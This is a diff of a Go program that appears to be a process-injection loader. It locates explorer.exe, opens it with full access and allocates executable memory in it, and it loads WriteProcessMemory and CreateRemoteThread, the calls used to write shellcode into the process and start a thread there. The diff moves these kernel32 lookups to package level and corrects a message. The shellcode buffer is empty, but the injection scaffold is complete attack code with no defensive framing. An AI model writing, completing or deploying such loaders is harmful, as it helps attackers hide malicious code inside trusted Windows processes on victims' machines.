@@ -35,6 +35,10 @@ var (
     procProcess32Next = kernel32.MustFindProc("Process32NextW")
     procCloseHandle = kernel32.MustFindProc("CloseHandle")
     procLstrcmpi = kernel32.MustFindProc("lstrcmpiW")
+    openProcess = kernel32.MustFindProc("OpenProcess")
+    virtualAllocEx = kernel32.MustFindProc("VirtualAllocEx")
+    writeProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
+    createRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
 )
 
 
@@ -43,7 +47,7 @@ func main() {
     pid := FindTarget("explorer.exe")
 
     if pid != 0 {
-        fmt.Printf("Process Explorer.exe not found, PID: %d\n", pid)
+        fmt.Printf("Process Explorer.exe found, PID: %d\n", pid)
     } else {
         fmt.Println("Processo Explorer.exe not found")
     }
@@ -56,12 +60,6 @@ func main() {
 	sch := []byte("")
 
 	processID := (int(processId))
-
-	kernel32 := syscall.MustLoadDLL("kernel32.dll")
-	openProcess := kernel32.MustFindProc("OpenProcess")
-	virtualAllocEx := kernel32.MustFindProc("VirtualAllocEx")
-	writeProcessMemory := kernel32.MustFindProc("WriteProcessMemory")
-	createRemoteThread := kernel32.MustFindProc("CreateRemoteThread")
 
 	handle, _, _ := openProcess.Call(0x001F0FFF, 0, uintptr(processID))
 	destAddress, _, _ := virtualAllocEx.Call(handle, 0, uintptr(len(sch)), 0x1000|0x2000, 0x40)
